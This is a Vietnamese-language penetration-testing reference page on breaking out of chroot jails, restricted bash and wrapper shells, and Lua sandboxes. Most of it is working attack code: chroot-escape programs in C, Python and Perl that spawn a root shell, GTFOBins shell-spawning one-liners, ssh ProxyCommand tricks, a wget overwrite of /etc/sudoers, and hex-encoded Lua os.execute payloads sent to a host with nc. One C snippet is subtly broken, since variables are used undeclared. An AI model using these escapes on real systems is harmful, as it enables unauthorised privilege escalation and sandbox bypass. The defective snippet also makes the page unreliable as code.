# Thoát khỏi Jail

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Tìm kiếm trên** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **để xem bạn có thể thực thi binary nào có thuộc tính "Shell"**

## Thoát khỏi Chroot

Theo [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Cơ chế chroot **không nhằm mục đích bảo vệ** khỏi hành vi can thiệp có chủ ý của **người dùng có đặc quyền** (**root**). Trên hầu hết các hệ thống, các ngữ cảnh chroot không xếp chồng đúng cách và các chương trình bị chroot **có đủ đặc quyền có thể thực hiện chroot lần thứ hai để thoát ra**.\
Thông thường, điều này có nghĩa là bạn cần quyền root bên trong chroot để thoát.<sup>[[4]](#references)</sup>

> [!TIP]
> **Công cụ** [**chw00t**](https://github.com/earthquake/chw00t) được tạo ra để khai thác các tình huống sau và thoát khỏi `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Nếu bạn là **root** bên trong chroot, bạn **có thể thoát** bằng cách tạo **một chroot khác**. Nguyên nhân là 2 chroot không thể cùng tồn tại (trên Linux), vì vậy nếu bạn tạo một thư mục rồi **tạo chroot mới** trong thư mục đó khi **bạn đang ở bên ngoài nó**, bạn sẽ ở **bên ngoài chroot mới** và do đó sẽ ở trong FS.
>
> Điều này xảy ra vì thông thường chroot KHÔNG chuyển thư mục làm việc của bạn sang thư mục được chỉ định, nên bạn có thể tạo một chroot nhưng vẫn ở bên ngoài nó.<sup>[[4]](#references)[[5]](#references)</sup>

Thông thường, bạn sẽ không tìm thấy binary `chroot` bên trong chroot jail, nhưng bạn **có thể biên dịch, tải lên và thực thi** một binary:

<details>

<summary>C: break_chroot.c</summary>

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

</details>

<details>

<summary>Python</summary>

```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```

</details>

<details>

<summary>Perl</summary>

```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

</details>

### Root + fd đã lưu

> [!WARNING]
> Điều này tương tự trường hợp trước, nhưng trong trường hợp này, **attacker lưu một file descriptor trỏ đến thư mục hiện tại**, sau đó **tạo chroot trong một thư mục mới**. Cuối cùng, vì **có quyền truy cập** vào **FD** đó **bên ngoài** chroot, attacker truy cập thư mục qua FD và **thoát ra**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("tmpdir", 0755);
    dir_fd = open(".", O_RDONLY);
    if(chroot("tmpdir")){
        perror("chroot");
    }
    fchdir(dir_fd);
    close(dir_fd);
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
}
```

</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD có thể được truyền qua Unix Domain Sockets, vì vậy:
>
> - Tạo một tiến trình con (fork)
> - Tạo UDS để tiến trình cha và con có thể giao tiếp
> - Chạy chroot trong tiến trình con ở một thư mục khác
> - Trong tiến trình cha, tạo một FD trỏ đến thư mục nằm ngoài chroot mới của tiến trình con
> - Truyền FD đó cho tiến trình con qua UDS
> - Tiến trình con chdir đến FD đó; vì nó nằm ngoài chroot của tiến trình con, tiến trình này sẽ thoát khỏi jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Mount thiết bị root (/) vào một thư mục bên trong chroot
> - Chroot vào thư mục đó
>
> Điều này có thể thực hiện được trên Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Mount procfs vào một thư mục bên trong chroot (nếu chưa được mount)
> - Tìm một pid có mục root/cwd khác, chẳng hạn: /proc/1/root
> - Chroot vào mục đó.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Tạo một Fork (tiến trình con), rồi chroot vào một thư mục khác nằm sâu hơn trong FS và chuyển đến đó
> - Từ tiến trình cha, di chuyển thư mục chứa tiến trình con đến một thư mục nằm trước chroot của tiến trình con
> - Tiến trình con này sẽ thấy mình đang ở bên ngoài chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Việc một tiến trình có thể attach bằng `ptrace` hay không phụ thuộc vào thông tin xác thực, capabilities và các security module được bật như Yama; do đó, chính sách hệ thống có thể hạn chế việc debug giữa các tiến trình cùng user.<sup>[[8]](#references)</sup>
> - Nếu được phép attach, bạn có thể dùng ptrace để truy cập một tiến trình và thực thi shellcode bên trong tiến trình đó ([xem ví dụ này](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Liệt kê

Lấy thông tin về jail:

```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```

### Sửa đổi PATH

Kiểm tra xem bạn có thể sửa đổi biến môi trường PATH hay không.<sup>[[2]](#references)</sup>

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

### Sử dụng vim

Nếu có Vim, hãy đặt tùy chọn `shell` thành một shell mà bạn có thể thực thi rồi gọi `:shell`.<sup>[[10]](#references)</sup>

```bash
:set shell=/bin/sh
:shell
```

### Trình phân trang và trình xem trợ giúp

Nhiều môi trường bị hạn chế vẫn cho phép sử dụng **trình phân trang** hoặc **trình xem trợ giúp**. Thường có thể khai thác chúng nhanh hơn so với việc cố gắng dựng lại `PATH`.

```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```

Nếu có `git`, tùy chọn `--paginate` sẽ gửi đầu ra đến `less` hoặc `$PAGER`, rất hữu ích khi có thể thoát khỏi pager.<sup>[[9]](#references)</sup>

```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```

### Các one-liner GTFOBins phổ biến

Sau khi biết những binary nào có thể truy cập, hãy thử trước các lệnh gọi shell hiển nhiên:

```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```

Nếu bạn chỉ có thể **inject arguments** vào một lệnh được cho phép (thay vì chạy lệnh đó tự do), hãy kiểm tra cả **GTFOArgs**.<sup>[[17]](#references)</sup>

### Tạo script

Kiểm tra xem bạn có thể tạo một tệp thực thi có nội dung là _/bin/bash_ hay không.

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

### Lấy bash qua SSH

Nếu truy cập qua SSH, bạn thường có thể yêu cầu máy chủ chạy một **chương trình khác** thay vì restricted login shell.<sup>[[14]](#references)</sup>

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

Nếu `ssh` là một trong số ít binary được phép chạy cục bộ, hãy nhớ rằng nó cũng có thể bị lạm dụng như một **GTFOBin**; các tùy chọn `LocalCommand` và `ProxyCommand` sẽ thực thi các lệnh trợ giúp được cấu hình cục bộ.<sup>[[14]](#references)[[15]](#references)</sup>

```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

### Declare

Trong Bash, nameref chuyển hướng các phép gán sang một biến khác, còn việc thêm một phần tử vào `BASH_CMDS` sẽ thêm lệnh đó vào bảng băm lệnh nội bộ của Bash.<sup>[[11]](#references)[[12]](#references)</sup>

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

### Wget

Tùy chọn `-O` của Wget ghi nội dung đã tải xuống vào tệp đầu ra được chỉ định; nếu có thể ghi vào đường dẫn đó, tùy chọn này có thể ghi đè lên một tệp như `/etc/sudoers`.<sup>[[13]](#references)</sup>

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

### Các wrapper shell bị giới hạn (`git-shell`, `rssh`, `lshell`)

Một số môi trường không đưa bạn vào `rbash` thông thường mà vào các **wrapper** như `git-shell`, `rssh` hoặc `lshell`:

- `git-shell` chỉ chấp nhận các lệnh Git phía máy chủ cùng những lệnh có trong `~/git-shell-commands/`. Nếu thư mục đó tồn tại, hãy chạy `help` để liệt kê các hành động tùy chỉnh được phép. Nếu bạn có thể **ghi** vào đó, mọi tệp thực thi được đặt trong thư mục này đều có thể được gọi.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` thường chỉ cho phép `scp`, `sftp`, `rsync` hoặc các thao tác kiểu Git. Trong những trường hợp đó, trước tiên hãy tập trung vào **các cách ghi tệp**: tải `authorized_keys`, một tệp khởi động shell hoặc một helper script lên vị trí có thể ghi, sau đó kết nối lại bằng `ssh -t ...`.
- Nếu wrapper chỉ lọc dòng lệnh, hãy liệt kê các binary có thể truy cập, rồi chuyển hướng sang **GTFOBins / GTFOArgs**.

### Các thủ thuật khác

Ngoài ra, hãy xem:

- [**Fireshell Security - Các kỹ thuật thoát khỏi Linux shell bị giới hạn**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Thoát khỏi Linux shell bị giới hạn**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Trang này cũng có thể hữu ích:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Các thủ thuật thoát khỏi Python jail có trong trang sau:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Bạn có thể tìm thấy các hàm global có thể sử dụng trong Lua tại trang này: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Các hàm tiêu chuẩn `load`, `string.char` và `os.execute` có thể tạo và chạy chunk này khi chúng khả dụng.<sup>[[16]](#references)</sup>

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

Có thể lấy một hàm trong bảng bằng `rawget` thay vì cú pháp dấu chấm.<sup>[[16]](#references)</sup>

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

Dùng `pairs` để duyệt qua bảng thư viện.<sup>[[16]](#references)</sup>

```bash
for k,v in pairs(string) do print(k,v) end
```

Thứ tự mà `pairs` liệt kê các chỉ mục của bảng không được xác định, vì vậy đừng dựa vào việc một hàm cụ thể sẽ xuất hiện đầu tiên. Nếu cần thực thi một hàm cụ thể, bạn có thể thực hiện brute force bằng cách tải các môi trường Lua khác nhau và gọi hàm đầu tiên của thư viện.<sup>[[16]](#references)</sup>

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**Mở shell Lua tương tác**: Nếu bạn đang ở trong một shell Lua bị giới hạn, bạn có thể mở một shell Lua mới (và hy vọng là không bị giới hạn) bằng cách gọi `debug.debug()`, thao tác này sẽ đưa bạn vào chế độ tương tác.<sup>[[16]](#references)</sup>

```bash
debug.debug()
```

## References

- [1] [Chw00t: Cách thoát khỏi các giải pháp Chroot khác nhau (Bucsay Balazs, bài nói chuyện và slide tại DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Sổ tay tham khảo GNU Bash – Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Tài liệu Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – Công cụ thoát chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Tài liệu Git](https://git-scm.com/docs/git)
- [10] [:shell – Tài liệu Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Các lệnh dựng sẵn Bash – Sổ tay tham khảo GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Biến Bash – Sổ tay tham khảo GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Sổ tay GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – Trang hướng dẫn OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – Trang hướng dẫn OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Sổ tay tham khảo Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Danh sách vector khai thác Argument Injection](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
